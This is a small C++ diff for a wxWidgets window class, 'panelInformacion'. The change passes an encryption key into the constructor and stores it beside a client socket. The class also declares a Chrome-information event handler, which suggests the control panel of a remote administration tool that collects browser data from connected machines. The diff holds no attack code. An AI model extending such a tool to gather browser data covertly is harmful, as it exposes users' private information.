@@ -11,10 +11,11 @@ namespace EnumPanelInfoIDS {
 
 class panelInformacion : public wxFrame {
 	public:
-		panelInformacion(wxWindow* _wxParent, SOCKET _sckSocket, std::string _strID);
+		panelInformacion(wxWindow* _wxParent, SOCKET _sckSocket, std::string _strID, ByteArray c_key);
 
 	private:
 		SOCKET sckCliente = INVALID_SOCKET;
+		ByteArray enc_key;
 		std::string strdID = "";
 		//Eventos
 		void OnChromeInfo(wxCommandEvent& event);
